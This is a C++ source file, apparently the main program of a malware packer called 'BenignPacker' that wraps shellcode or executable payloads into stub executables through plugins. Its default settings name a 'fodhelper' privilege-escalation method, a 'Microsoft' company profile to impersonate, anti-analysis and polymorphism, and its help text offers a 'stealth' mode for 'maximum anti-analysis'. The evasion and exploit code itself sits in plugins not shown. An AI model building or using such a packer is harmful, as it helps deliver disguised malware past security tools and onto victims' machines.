/*
========================================================================================
BENIGN PACKER - MAIN APPLICATION
========================================================================================
FEATURES:
- Plugin system integration
- UniqueStub71Plugin support
- MASM Assembler Plugin support
- Visual Studio 2022 Native Compilation
========================================================================================
*/

#include "IStubGenerator.h"
#include "UniqueStub71Plugin.h"
#include <iostream>
#include <fstream>
#include <vector>
#include <string>
#include <map>
#include <memory>
#include <filesystem>

using namespace BenignPacker;

class BenignPackerApp {
private:
    std::map<std::string, std::unique_ptr<IStubGenerator>> plugins;
    std::map<std::string, std::string> settings;

public:
    BenignPackerApp() {
        InitializePlugins();
        LoadDefaultSettings();
    }

    ~BenignPackerApp() {
        // Cleanup
    }

    void InitializePlugins() {
        // Initialize UniqueStub71Plugin
        auto uniqueStubPlugin = CreateUniqueStub71Plugin();
        if (uniqueStubPlugin) {
            plugins["UniqueStub71"] = std::move(uniqueStubPlugin);
            std::cout << "Loaded UniqueStub71Plugin" << std::endl;
        }

        // Initialize MASMAssemblerPlugin
        // auto masmPlugin = CreateMASMAssemblerPlugin();
        // if (masmPlugin) {
        //     plugins["MASMAssembler"] = std::move(masmPlugin);
        //     std::cout << "Loaded MASMAssemblerPlugin" << std::endl;
        // }
    }

    void LoadDefaultSettings() {
        settings["company_profile"] = "Microsoft";
        settings["mutex_system"] = "Advanced";
        settings["exploit_method"] = "fodhelper";
        settings["anti_analysis"] = "true";
        settings["polymorphic"] = "true";
        settings["output_format"] = "exe";
    }

    bool ProcessFile(const std::string& inputFile, const std::string& outputFile, const std::string& method = "advanced") {
        if (plugins.empty()) {
            std::cerr << "No plugins loaded!" << std::endl;
            return false;
        }

        // Use the first available plugin (UniqueStub71Plugin)
        auto& plugin = plugins.begin()->second;
        
        // Initialize plugin with settings
        if (!plugin->Initialize(settings)) {
            std::cerr << "Failed to initialize plugin" << std::endl;
            return false;
        }

        // Create execution context
        ExecutionContext context;
        context.inputFile = inputFile;
        context.outputFile = outputFile;
        context.method = method;
        context.verbose = true;
        context.debug = false;

        // Execute plugin
        PluginResult result = plugin->Execute(context);

        if (result.success) {
            std::cout << "Success: " << result.message << std::endl;
            std::cout << "Input size: " << result.metadata["input_size"] << " bytes" << std::endl;
            std::cout << "Output size: " << result.metadata["output_size"] << " bytes" << std::endl;
            std::cout << "Method used: " << result.metadata["method"] << std::endl;
            return true;
        } else {
            std::cerr << "Error: " << result.message << std::endl;
            if (!result.errorDetails.empty()) {
                std::cerr << "Details: " << result.errorDetails << std::endl;
            }
            return false;
        }
    }

    void ShowHelp() {
        std::cout << "BenignPacker - Advanced Stub Generation Framework" << std::endl;
        std::cout << "=================================================" << std::endl;
        std::cout << "Usage: BenignPacker.exe <input_file> [output_file] [method]" << std::endl;
        std::cout << std::endl;
        std::cout << "Methods:" << std::endl;
        std::cout << "  default  - Basic stub generation" << std::endl;
        std::cout << "  advanced - Full features (recommended)" << std::endl;
        std::cout << "  mutex    - Focus on mutex protection" << std::endl;
        std::cout << "  stealth  - Maximum anti-analysis" << std::endl;
        std::cout << std::endl;
        std::cout << "Supported formats: .bin, .exe, .dll, .raw, .shellcode" << std::endl;
        std::cout << std::endl;
        std::cout << "Examples:" << std::endl;
        std::cout << "  BenignPacker.exe payload.bin" << std::endl;
        std::cout << "  BenignPacker.exe payload.bin output.exe advanced" << std::endl;
        std::cout << "  BenignPacker.exe payload.bin stealth_output.exe stealth" << std::endl;
    }

    void ShowPluginInfo() {
        std::cout << "Loaded Plugins:" << std::endl;
        std::cout << "===============" << std::endl;
        
        for (const auto& [name, plugin] : plugins) {
            PluginConfig config = plugin->GetConfig();
            std::cout << "Name: " << config.name << std::endl;
            std::cout << "Version: " << config.version << std::endl;
            std::cout << "Description: " << config.description << std::endl;
            std::cout << "Author: " << config.author << std::endl;
            std::cout << "Supported formats: ";
            for (const auto& format : config.supportedFormats) {
                std::cout << format << " ";
            }
            std::cout << std::endl;
            std::cout << "Capabilities:" << std::endl;
            for (const auto& [key, value] : config.capabilities) {
                std::cout << "  " << key << ": " << value << std::endl;
            }
            std::cout << std::endl;
        }
    }
};

int main(int argc, char* argv[]) {
    std::cout << "BenignPacker - Advanced Stub Generation Framework" << std::endl;
    std::cout << "Version 1.0.0 - Built with Visual Studio 2022" << std::endl;
    std::cout << "=================================================" << std::endl;

    BenignPackerApp app;

    // Show plugin information
    app.ShowPluginInfo();

    if (argc < 2) {
        app.ShowHelp();
        return 1;
    }

    std::string inputFile = argv[1];
    std::string outputFile = (argc > 2) ? argv[2] : "output.exe";
    std::string method = (argc > 3) ? argv[3] : "advanced";

    // Check if input file exists
    if (!std::filesystem::exists(inputFile)) {
        std::cerr << "Error: Input file '" << inputFile << "' not found!" << std::endl;
        return 1;
    }

    std::cout << "Processing file: " << inputFile << std::endl;
    std::cout << "Output file: " << outputFile << std::endl;
    std::cout << "Method: " << method << std::endl;
    std::cout << "=================================================" << std::endl;

    // Process the file
    if (app.ProcessFile(inputFile, outputFile, method)) {
        std::cout << "=================================================" << std::endl;
        std::cout << "Success! Generated file: " << outputFile << std::endl;
        return 0;
    } else {
        std::cout << "=================================================" << std::endl;
        std::cout << "Failed to process file!" << std::endl;
        return 1;
    }
}